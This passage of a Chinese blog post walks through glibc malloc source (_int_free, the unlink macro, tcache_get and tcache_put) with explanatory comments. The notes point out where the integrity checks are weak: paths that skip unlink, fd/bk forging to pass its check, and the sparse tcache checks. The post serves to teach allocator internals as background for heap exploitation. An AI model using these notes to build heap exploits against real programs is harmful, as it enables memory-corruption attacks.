class="line">      <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">         of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">         after getting the lock. */</span></span><br><span class="line">      <span class="comment">// 与上锁有关，不深究</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">            assert(locked == <span class="number">0</span>);</span><br><span class="line">            mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">            chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ ||</span><br><span class="line">                chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">          &#125;)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">        (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将chunk的mem部分全部设置为perturb_byte</span></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av); <span class="comment">// 设置fast chunk的标记位</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size); <span class="comment">// 获取索引</span></span><br><span class="line">    fb = &amp;fastbin(av, idx); <span class="comment">// 获取对应fastbin的头指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    <span class="comment">// 将p插入fastbin链表</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">         (i.e., double free).  */</span></span><br><span class="line">      <span class="comment">// 检查是否存在double free，通过检查fastbin中的最后一个chunk(old==fastbin(av,idx))与待释放的p是否指向同一个chunk </span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">         size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">         only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">         deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">      <span class="comment">// 检查锁，并得到idx</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">      p-&gt;fd = old2 = old;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前 free 的 chunk 不是通过 mmap()分配的，并且当前还没有获得分配区的锁，获取分配区的锁。</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;</span><br><span class="line">                             (<span class="keyword">char</span> *)nextchunk &gt;=</span><br><span class="line">                                 ((<span class="keyword">char</span> *)av-&gt;top + chunksize(av-&gt;top)),</span><br><span class="line">                         <span class="number">0</span>)) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">        __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>)prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h4 id="非mmap分配的内存"><a href="#非mmap分配的内存" class="headerlink" title="非mmap分配的内存"></a>非mmap分配的内存</h4><p>非fast_chunk并且也非mmap分配的内存在释放时，会执行合并操作。合并的顺序是先考虑物理低地址空闲块(后向合并)，后考虑物理高地址空闲块(前向合并)，合并后的 chunk 指向合并的 chunk 的低地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="comment">// 获取锁</span></span><br><span class="line">    <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取下一个chunk</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="comment">// 检查释放的chunk不能为top_chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="comment">// 检查nextchunk不能超过arena的边界(top_chunk)</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;</span><br><span class="line">                             (<span class="keyword">char</span> *)nextchunk &gt;=</span><br><span class="line">                                 ((<span class="keyword">char</span> *)av-&gt;top + chunksize(av-&gt;top)),</span><br><span class="line">                         <span class="number">0</span>)) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="comment">// 检查inuse位，防止double free</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取nextchunk_size，并检查大小是否合法(至少2*SIZE_SZ且不大于系统可提供的内存)</span></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">        __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 上面检查结束后，将真正进行合并</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将指针的mem域设置为perturb_byte</span></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="comment">// 最后判断上一个chunk的inuse位，若未使用则进行合并</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>)prevsize)); <span class="comment">// 重新设置p到低地址处</span></span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断下一个chunk是否是top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      <span class="comment">// 获取inuse位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">// 如果不在使用，则合并</span></span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">// 否则清空待释放chunk的使用状态(inuse)</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        将释放并合并后的chunk放入unsorted bin中，直到下一次malloc</span></span><br><span class="line"><span class="comment">        执行bins循环时，才有机会放入对应的bin。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 插入unsorted bin操作</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// 若下一个chunk是top chunk，则与top chunk合并</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 当合并后的chunksize大于FASTBIN_CONSOLIDATION_THRESHOLD时，会</span></span><br><span class="line">    <span class="comment">// 执行裁剪操作，一般合并到 top chunk 都会执行这部分代码。</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="comment">// 合并fastbin</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 当前为主分配区时，直接判断top chunksize是否大于被裁剪的阈值</span></span><br><span class="line">      <span class="comment">// 达到阈值，则使用systrim进行裁剪，将内存返回给系统</span></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// 非主分配区，则使用heap_trim进行裁剪</span></span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放锁</span></span><br><span class="line">    <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">      assert(locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="mmap分配的内存"><a href="#mmap分配的内存" class="headerlink" title="mmap分配的内存"></a>mmap分配的内存</h4><p>使用munmap_chunk释放。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  munmap_chunk(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>在上面的代码中频繁出现了unlink，这实际上是一个宏，用来从链表中取出chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD)                                                  \</span></span><br><span class="line"><span class="meta">  &#123;                                                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;                                                                \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;                                                                \</span></span><br><span class="line"><span class="meta">    <span class="comment">// 检查链中的前后块中是否指向待释放chunks                                  \</span></span></span><br><span class="line"><span class="comment"><span class="meta">    if (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))                       \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      malloc_printerr(check_action, &quot;corrupted double-linked list&quot;, P, AV);    \</span></span></span><br><span class="line"><span class="comment"><span class="meta">    else &#123;                                                                     \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      FD-&gt;bk = BK;                                                             \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      BK-&gt;fd = FD;                                                             \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      // 若非small chunk，那么还需要考虑nextsize双向链表                       \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (!in_smallbin_range(P-&gt;size) &amp;&amp;                                       \</span></span></span><br><span class="line"><span class="comment"><span class="meta">          __builtin_expect(P-&gt;fd_nextsize != NULL, 0)) &#123;                       \</span></span></span><br><span class="line"><span class="comment"><span class="meta">        if (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) ||           \</span></span></span><br><span class="line"><span class="comment"><span class="meta">            __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))             \</span></span></span><br><span class="line"><span class="comment"><span class="meta">          malloc_printerr(check_action,                                        \</span></span></span><br><span class="line"><span class="comment"><span class="meta">                          &quot;corrupted double-linked list (not small)&quot;, P, AV);  \</span></span></span><br><span class="line"><span class="comment"><span class="meta">        if (FD-&gt;fd_nextsize == NULL) &#123;                                         \</span></span></span><br><span class="line"><span class="comment"><span class="meta">          if (P-&gt;fd_nextsize == P)                                             \</span></span></span><br><span class="line"><span class="comment"><span class="meta">            FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                            \</span></span></span><br><span class="line"><span class="comment"><span class="meta">          else &#123;                                                               \</span></span></span><br><span class="line"><span class="comment"><span class="meta">            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                  \</span></span></span><br><span class="line"><span class="comment"><span class="meta">            FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                                  \</span></span></span><br><span class="line"><span class="comment"><span class="meta">            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                  \</span></span></span><br><span class="line"><span class="comment"><span class="meta">            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                  \</span></span></span><br><span class="line"><span class="comment"><span class="meta">          &#125;                                                                    \</span></span></span><br><span class="line"><span class="comment"><span class="meta">        &#125; else &#123; // 否则只需要考虑fd/bk链表                                    \</span></span></span><br><span class="line"><span class="comment"><span class="meta">          P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                        \</span></span></span><br><span class="line"><span class="comment"><span class="meta">          P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                        \</span></span></span><br><span class="line"><span class="comment"><span class="meta">        &#125;                                                                      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      &#125;                                                                        \</span></span></span><br><span class="line"><span class="comment"><span class="meta">    &#125;                                                                          \</span></span></span><br><span class="line"><span class="comment"><span class="meta">  &#125;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>unlink出现在:</p>
<ul>
<li>malloc<ul>
<li>从恰好大小合适的 large bin 中获取 chunk。<ul>
<li>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</li>
<li>依次遍历处理 unsorted bin 时也没有使用 unlink 。</li>
</ul>
</li>
<li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。</li>
</ul>
</li>
<li>free<ul>
<li>后向合并，合并物理相邻低地址空闲 chunk。</li>
<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
</ul>
</li>
<li>malloc_consolidate<ul>
<li>后向合并，合并物理相邻低地址空闲 chunk。</li>
<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
</ul>
</li>
<li>realloc<ul>
<li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
</ul>
</li>
</ul>
<p>由于unlink中存在一个检测<code>if (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))</code>， 因此在利用unlink(一般是合并)时，还需要构造fd与bk。</p>
<h2 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc_2.27"></a>glibc_2.27</h2><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><p>tcache是glibc高版本(2.26以后)中出现的新技术，使用的优先级高于fastbin，并且分配过程类似fastbin。</p>
<h4 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h4><p>在/malloc/malloc.c中声明了两个新的结构体:</p>
<ul>
<li>tcache_entry</li>
<li>tcache_perthread_struct</li>
</ul>
<h5 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>该结构体用于链接空闲的chunk结构体，next指针指向下一个大小相同的chunk。</p>
<h5 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h5><p>从这个结构体名字可以看出，每个线程都有自己对应的结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p>该结构体用于管理tcache bins，counts数组用来计数每个bin中的tcache chunk个数;entries数组则是保存每个bin的链表，类似arena中的fastbinY，指向释放的最后一个chunk。</p>
<p>而空闲的tcache chunk与fastbin chunk相比，二者的结构是有重合的：在tcache chunk释放后，chunk的mem域会被初始化为tcache_entry，那么next指针就与fd重合了。因此tcache chunk的管理可以看作类似fastbin chunk的管理。</p>
<p>与fastbin的差异在于，tcache_perthread_struct也就是管理tcache的结构位于堆的首部；管理tcache的操作也有些许不同。</p>
<h4 id="管理tcache"><a href="#管理tcache" class="headerlink" title="管理tcache"></a>管理tcache</h4><p>管理tcache主要使用两个函数：</p>
<ul>
<li>tcache_get</li>
<li>tcache_put</li>
</ul>
<p>也都在/malloc/malloc.c文件中</p>
<h5 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h5><p>首先查看在__libc_malloc中的改动:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>这一段代码是在_int_malloc之前执行的，因此优先级是高于其他bin中的内存。</p>
<p>并且获取chunk使用了tcache_get函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查十分简陋，仅仅检查了tc_idx，而没有其他关于tcache_entry结构体的检查。</p>
<h5 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h5><p>再查看在_int_free中的改动:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span 